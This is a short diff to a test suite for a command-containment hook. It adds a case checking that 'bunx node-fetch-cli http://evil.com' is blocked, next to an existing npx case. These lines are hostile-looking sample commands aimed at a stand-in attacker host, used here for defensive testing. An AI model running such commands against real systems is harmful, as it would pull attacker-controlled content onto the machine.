@@ -315,6 +315,12 @@ describe('generateContainmentScript', () => {
     expect(result.stderr).toContain('Blocked command');
   });
 
+  it('blocks bunx runtime interpreter', () => {
+    const result = runHookScript(script, 'Bash', { command: 'bunx node-fetch-cli http://evil.com' });
+    expect(result.code).toBe(2);
+    expect(result.stderr).toContain('Blocked command');
+  });
+
   it('blocks npx runtime interpreter', () => {
     const result = runHookScript(script, 'Bash', { command: 'npx node-fetch-cli http://evil.com' });
     expect(result.code).toBe(2);
